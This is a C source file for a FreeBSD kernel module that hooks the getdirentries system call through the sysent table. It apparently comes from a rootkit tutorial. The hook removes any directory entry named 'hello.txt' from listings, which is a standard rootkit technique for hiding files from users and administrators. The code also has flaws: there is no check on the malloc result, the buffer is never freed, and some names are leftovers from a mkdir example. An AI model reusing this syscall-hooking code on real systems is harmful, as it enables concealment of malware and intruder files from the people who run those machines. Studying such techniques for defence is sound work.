#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/dirent.h>

/* getdirentries system call hook */
static int
getdirentries_hook(struct thread* td, void* syscall_args)
{
	struct dirent* dp;
	struct dirent* current;
	unsigned int size, count;
	struct getdirentries_args* /* {
		int	fd;
		char*	buf;
		size_t	nbytes;
		off_t*	basep;
	}  */ uap;

	sys_getdirentries(td, syscall_args);
	size = td->td_retval[0];
	uap = (struct getdirentries_args*)syscall_args;

	/* Check the syscall actually returned something */
	if (size > 0)
	{
		/* Allocate memory for the dirent struct array */
		dp = (struct dirent*)malloc(size, M_TEMP, M_NOWAIT);

		/* Copy the dirents from user space to this new buffer */
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;

		/*
		 * dirent looks like:
		 *
		 * struct dirent {
		 * 	__uint32_t	d_fileno;	// inode number
		 * 	__uint16_t	d_reclen;	// length of entry
		 * 	__uint8_t	d_type;		// file type
		 * 	__uint8_t	d_namlen;	// length of name
		 * 	char		d_name[256];	// name
		 * }
		 *
		 * As we iterate over the entries, check if either the length of
		 * the entry is 0 (the last one always is) or if we have
		 * otherwise counted them all.
		 */
		while ((current->d_reclen != 0) && (count > 0))
		{
			uprintf("%s\n", current->d_name);
			count -= current->d_reclen;

			/* Check if this is a file we want to hide */
			if(strncmp(current->d_name, "hello.txt", current->d_namlen) == 0)
			{
				/* Copy the next entry over this current entry */
				bcopy((char*)current + current->d_reclen, current, count);

				/* Decrease the size to accomodate for the missing entry */
				size -= current->d_reclen;
				td->td_retval[0] = size;
				copyout(dp, uap->buf, size);
				break;
			}

			/* If we have not reached the end, set current to the next entry */
			if (count != 0)
				current = (struct dirent*)((char*)current + current->d_reclen);
		}
	}

	return 0;
}

/* The function called at load / unload */
static int
load(struct module* module, int cmd, void* arg)
{
	int error = 0;

	switch (cmd)
	{
		case MOD_LOAD:
			/* Replace mkdir with mkdir_hook */
			sysent[SYS_getdirentries].sy_call = (sy_call_t*)getdirentries_hook;
			break;

		case MOD_UNLOAD:
			/* Change things back to normal */
			sysent[SYS_getdirentries].sy_call = (sy_call_t*)sys_getdirentries;
			break;

		default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}

static moduledata_t mkdir_hook_mod = {
	"getdirentries_hook",    /* module name */
	load,                    /* event handler */
	NULL                     /* extra data */
};

DECLARE_MODULE(mkdir_hook, mkdir_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
